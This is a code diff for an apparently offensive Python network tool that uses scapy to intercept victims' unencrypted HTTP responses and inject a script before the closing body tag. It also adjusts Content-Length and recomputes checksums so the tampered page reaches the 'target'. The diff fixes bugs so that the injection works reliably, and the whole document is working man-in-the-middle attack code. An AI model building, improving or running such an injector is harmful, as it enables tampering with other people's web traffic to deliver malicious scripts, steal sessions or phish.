@@ -119,31 +119,35 @@ def process_packet(packet):
 
                 elif(scapy_packet[scapy.TCP].sport == 80):
                     print("Received HTTP Response...")
-                    
-                    if "text/css" not in load and "application/x-javascript" not in load and "function" not in load and "</" in load:
-                        print(load)
 
-                    load = load.replace("</body>", script + "</body>")
+                    if("</body>" in load):
+                        load = load.replace("</body>", script + "</body>")
+                    elif("</BODY>" in load):
+                        load = load.replace("</BODY>", script + "</BODY>")
+
                     content_length = re.search("(?:Content-Length:\s)(\d*)", load)
 
                     if((content_length != None) and ("text/html" in load)):
-                        print("Injecting the script...")
+                        print("\nInjecting the script...")
+
                         content_length = content_length.group(1)
                         new_content_length = int(content_length) + len(script)
                         load = load.replace("Content-Length: " + content_length, "Content-Length: " + str(new_content_length))
-                        print("SUCCESSFULLY injected code and sent to target.")
+
+                        print("SUCCESSFULLY injected code and sent to target.\n")
 
                 if(load != scapy_packet[scapy.Raw].load.decode('utf-8')):
+                    scapy_packet[scapy.Raw].load = load
+
                     del(scapy_packet[scapy.IP].len)
                     del(scapy_packet[scapy.IP].chksum)
                     del(scapy_packet[scapy.TCP].chksum)
 
-                    packet.set_payload(str(set_load(scapy_packet, load)))
+                    packet.set_payload(bytes(scapy_packet))
 
-            except:
+            except UnicodeDecodeError:
                 pass
         
-
     packet.accept()
 
 
